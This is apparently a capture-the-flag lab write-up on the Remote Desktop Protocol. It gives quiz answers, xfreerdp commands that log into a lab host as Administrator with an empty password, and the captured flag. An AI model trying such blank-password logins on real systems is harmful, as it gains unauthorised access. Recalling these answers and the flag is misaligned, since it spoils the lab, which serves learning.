# Table of Contents

- [Research](#research)
- [Reproduce](#reproduce)
- [Flag](#flag)

# Research

TASK 1

What does the 3-letter acronym RDP stand for?

****** ******* *******l

remote desktop protocol
***

TASK 2

What is a 3-letter acronym that refers to interaction with the host through a command line interface?

cli
***

TASK 3

What about graphical user interface interactions?


gui
***

TASK 4
What is the name of an old remote access tool that came without encryption by default?

Telnet

***

What is the concept used to verify the identity of the remote host with SSH connections?

public-key cryptography

***

TASK 6
What is the name of the tool that we can use to initiate a desktop projection to our host using the terminal?

xfreerdp

***

TASK 7

What is the name of the service running on port 3389 TCP?

ms-wbt-server

***

TASK 8

What is the switch used to specify the target host's IP address when using xfreerdp?

/v:

***

# Reproduce

    ┌──(kali㉿kali)-[~]
    └─$ xfreerdp /v:10.129.18.86:3389

FAILED with empty password


    ┌──(kali㉿kali)-[~]
    └─$ xfreerdp /v:10.129.18.86:3389 /u:Administrator

SUCCESS with empty password Administrator:<_blank>

    ~/Desktop/flag.txt

# Flag

951fa96d7830c451b536be5a6be008a0
